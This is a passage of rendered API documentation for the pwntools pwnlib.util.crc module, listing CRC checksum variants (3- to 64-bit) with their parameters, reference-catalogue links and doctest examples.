<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32q</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">806403967</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_3_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_3_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_3_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_3_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3</li>
<li>width   = 3</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x7</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.3">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.3</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_3_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_3_rohc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_3_rohc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_3_rohc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_3_rohc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3</li>
<li>width   = 3</li>
<li>init    = 0x7</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-3-rohc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-3-rohc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_3_rohc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">6</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_40_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_40_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_40_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_40_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4820009</li>
<li>width   = 40</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.40">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.40</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_40_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">910907393606</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_4_interlaken">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_4_interlaken</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_4_interlaken" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_4_interlaken checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3</li>
<li>width   = 4</li>
<li>init    = 0xf</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xf</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.4">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.4</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_4_interlaken</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">11</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_4_itu">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_4_itu</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_4_itu" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_4_itu checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3</li>
<li>width   = 4</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-4-itu">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-4-itu</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_4_itu</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">7</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_5_epc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_5_epc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_5_epc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_5_epc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x9</li>
<li>width   = 5</li>
<li>init    = 0x9</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.5">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.5</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_5_epc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_5_itu">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_5_itu</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_5_itu" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_5_itu checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x15</li>
<li>width   = 5</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-5-itu">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-5-itu</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_5_itu</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">7</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_5_usb">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_5_usb</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_5_usb" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_5_usb checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x5</li>
<li>width   = 5</li>
<li>init    = 0x1f</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x1f</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-5-usb">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-5-usb</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_5_usb</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">25</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_64">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_64</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_64" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_64 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x42f0e1eba9ea3693</li>
<li>width   = 64</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.64">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.64</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_64</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">7800480153909949255</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_64_go_iso">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_64_go_iso</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_64_go_iso" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_64_go_iso checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1b</li>
<li>width   = 64</li>
<li>init    = 0xffffffffffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffffffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-go-iso">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-go-iso</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_64_go_iso</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">13333283586479230977</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_64_we">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_64_we</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_64_we" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_64_we checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x42f0e1eba9ea3693</li>
<li>width   = 64</li>
<li>init    = 0xffffffffffffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffffffffffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-we">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-we</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_64_we</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">7128171145767219210</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_64_xz">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_64_xz</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_64_xz" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_64_xz checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x42f0e1eba9ea3693</li>
<li>width   = 64</li>
<li>init    = 0xffffffffffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffffffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-xz">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-64-xz</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_64_xz</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">11051210869376104954</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_6_cdma2000_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_6_cdma2000_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_6_cdma2000_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_6_cdma2000_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x27</li>
<li>width   = 6</li>
<li>init    = 0x3f</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.6">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.6</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_6_cdma2000_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">13</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_6_cdma2000_b">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_6_cdma2000_b</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_6_cdma2000_b" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_6_cdma2000_b checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x7</li>
<li>width   = 6</li>
<li>init    = 0x3f</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-cdma2000-b">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-cdma2000-b</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_6_cdma2000_b</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">59</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_6_darc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_6_darc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_6_darc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_6_darc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x19</li>
<li>width   = 6</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-darc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-darc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_6_darc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">38</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_6_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_6_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_6_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_6_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x2f</li>
<li>width   = 6</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x3f</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-gsm">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-gsm</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_6_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">19</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_6_itu">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_6_itu</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_6_itu" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_6_itu checksum.</p>
